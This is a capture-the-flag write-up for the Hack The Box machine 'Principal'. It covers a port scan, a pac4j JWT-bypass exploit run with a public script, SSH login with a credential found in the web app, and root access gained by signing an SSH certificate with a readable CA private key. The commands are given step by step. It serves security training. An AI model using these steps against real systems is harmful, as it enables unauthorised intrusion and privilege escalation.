# HTB – Principal | Linux | Medium

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 <target-ip>
```

**Revealed Ports:**

```
22/tcp   open  ssh
8080/tcp open  http-proxy
```

No other ports — doing full scan and UDP scan in bg, (did not get anything)

---

## Web Enumeration — Port 8080

Let's visit the site:

The website is running **v1.2.0 | Powered by pac4j** which has:

- `CVE-2023-25581` — RCE
- `CVE-2026-29000` — Critical JWT Authentication Bypass

Now that I tried using RCE directly, it's an authenticated RCE — so my plan is to use the JWT bypass first to get admin access to the website and then use the RCE to get access to the machine.

---

## Initial Access — CVE-2026-29000 (JWT Bypass)

https://github.com/STK-Security/CVE-2026-29000-pac4j-jwt.git

```bash
python3 ../CVE-2026-29000-pac4j-jwt/CVE-2026-29000.py \
  --url http://principal.htb:8080 \
  --jwks /api/auth/jwks \
  --enc A128GCM --role ROLE_ADMIN
```

Which gave me the JWT token of the admin — and for some reason I was still unauthorised, so I did more recon and came across the user **svc-b\*\*\*\*\*\*** who was a developer and had access to SSH, and got his password from **SETTINGS > SECURITY**.

```bash
ssh svc-b******@principal.htb
# pass: [REDACTED]
```

```bash
cat user.txt
```

---

## Privilege Escalation — svc-b****** → Root

The 1st thing I always check is local running services — nothing here.

Let's do the basic recon: no sudo rights, member of 2 groups `(svc-backup, dep*****)` — that's interesting. Did some more checks but nothing that caught my interest.

I started checking all the files the `dep*****` group can access and came across:

```
/etc/ssh/sshd_config.d/60-principal.conf
```

Came to know this machine uses a **Certificate Authority (CA) model**, and I was able to read the `ca.pub` and `ca` — from which I can make a root key and access `root.txt`.

So:

```bash
# 1. Generate a temp keypair
ssh-keygen -t rsa -f /tmp/pwned -N ""

# 2. Save the CA private key from the box into a file
nano /tmp/ca   # paste it, chmod it
chmod 600 /tmp/ca

# 3. Sign your public key as root
ssh-keygen -s /tmp/ca -I root_cert -n root -V +1h /tmp/pwned.pub

# 4. SSH in as root
ssh -i /tmp/pwned -i /tmp/pwned-cert.pub root@principal.htb
```

```bash
cat root.txt
```

---

ROOTED...

RATING : 4/5 
